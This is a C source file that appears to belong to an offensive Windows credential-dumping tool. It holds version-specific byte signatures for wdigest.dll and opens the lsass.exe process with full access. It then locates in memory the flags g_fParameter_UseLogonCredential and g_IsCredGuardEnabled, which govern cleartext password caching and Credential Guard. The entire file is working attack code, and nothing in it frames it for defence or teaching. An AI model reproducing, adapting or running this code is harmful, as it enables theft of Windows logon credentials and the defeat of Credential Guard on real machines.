#include "stdafx.h"

BYTE PTRN_WIN1607_SpAcceptCredentials[] = { 0x41, 0xb5, 0x01, 0x44, 0x88, 0x6d, 0x48, 0x85, 0xc0 };
BYTE PTRN_WIN1909_SpAcceptCredentials[] = { 0x41, 0xb4, 0x01, 0x44, 0x88, 0xa4, 0x24, 0xa8, 0x00, 0x00, 0x00, 0x85, 0xc0 };
BYTE PTRN_WIN2022_SpAcceptCredentials[] = { 0x41, 0xb5, 0x01, 0x85, 0xc0 };
PATCH_GENERIC g_References[] = {
	{WIN_BUILD_10_1607,	{sizeof(PTRN_WIN1607_SpAcceptCredentials),	PTRN_WIN1607_SpAcceptCredentials},	{0, NULL}, {-16, -10}},
	{WIN_BUILD_10_1703,	{sizeof(PTRN_WIN1909_SpAcceptCredentials),	PTRN_WIN1909_SpAcceptCredentials},	{0, NULL}, {-16, -10}},
	{WIN_BUILD_10_1709,	{sizeof(PTRN_WIN1909_SpAcceptCredentials),	PTRN_WIN1909_SpAcceptCredentials},	{0, NULL}, {-16, -10}},
	{WIN_BUILD_10_1803,	{sizeof(PTRN_WIN1909_SpAcceptCredentials),	PTRN_WIN1909_SpAcceptCredentials},	{0, NULL}, {-16, -10}},
	{WIN_BUILD_10_1809,	{sizeof(PTRN_WIN1909_SpAcceptCredentials),	PTRN_WIN1909_SpAcceptCredentials},	{0, NULL}, {-16, -10}},
	{WIN_BUILD_10_1903,	{sizeof(PTRN_WIN1909_SpAcceptCredentials),	PTRN_WIN1909_SpAcceptCredentials},	{0, NULL}, {-16, -10}},
	{WIN_BUILD_10_1909,	{sizeof(PTRN_WIN1909_SpAcceptCredentials),	PTRN_WIN1909_SpAcceptCredentials},	{0, NULL}, {-16, -10}},
	{WIN_BUILD_10_2004,	{sizeof(PTRN_WIN2022_SpAcceptCredentials),	PTRN_WIN2022_SpAcceptCredentials},	{0, NULL}, {-16, -10}},
	{WIN_BUILD_10_20H2,	{sizeof(PTRN_WIN2022_SpAcceptCredentials),	PTRN_WIN2022_SpAcceptCredentials},	{0, NULL}, {-16, -10}},
	{WIN_BUILD_10_21H2,	{sizeof(PTRN_WIN2022_SpAcceptCredentials),	PTRN_WIN2022_SpAcceptCredentials},	{0, NULL}, {-16, -10}},
	{WIN_MIN_BUILD_11,	{sizeof(PTRN_WIN2022_SpAcceptCredentials),	PTRN_WIN2022_SpAcceptCredentials},	{0, NULL}, {-16, -10}},
	{WIN_BUILD_2022,	{sizeof(PTRN_WIN2022_SpAcceptCredentials),	PTRN_WIN2022_SpAcceptCredentials},	{0, NULL}, {-16, -10}},
};

LSA_PACKAGE LsassPackage = { TRUE, L"wdigest.dll", {{NULL, 0, NULL}, FALSE, FALSE} };
LSA_CONTEXT cLsass = { NULL, {0, 0, 0} };

PWORD g_fParameter_UseLogonCredential;
PWORD g_IsCredGuardEnabled;

BOOL AcquireLSA()
{
	BOOL status = FALSE;
	DWORD pid;

	if (pid = GetProcessIdByName(L"lsass.exe"))
		cLsass.hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	else
		wprintf(L"[-] Lsass Process Not Found.");

	cLsass.osContext.MajorVersion = NT_MAJOR_VERSION;
	cLsass.osContext.MinorVersion = NT_MINOR_VERSION;
	cLsass.osContext.BuildNumber = NT_BUILD_NUMBER & 0x00007fff;

	if (GetVeryBasicModuleInformations(cLsass.hProcess) && LsassPackage.Module.isPresent)
	{
		wprintf(L"[*] Base address of wdigest.dll: 0x%016llx\n", LsassPackage.Module.Informations.DllBase.address);
		if (LsaSearchGeneric(&cLsass, &LsassPackage.Module, g_References, ARRAYSIZE(g_References), (PVOID*)&g_fParameter_UseLogonCredential, (PVOID*)&g_IsCredGuardEnabled)
			&& LsassPackage.Module.isInit)
		{
			wprintf(L"[*] Address of g_fParameter_UseLogonCredential: 0x%016llx\n", g_fParameter_UseLogonCredential);
			wprintf(L"[*] Address of g_IsCredGuardEnabled: 0x%016llx\n", g_IsCredGuardEnabled);
			status = TRUE;
		}
	}
	return status;
}


BOOL FindModules(PPROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation)
{
	if (_wcsicmp(LsassPackage.ModuleName, pModuleInformation->ModuleName->Buffer) == 0)
	{
		LsassPackage.Module.isPresent = TRUE;
		LsassPackage.Module.Informations = *pModuleInformation;
	}

	return TRUE;
}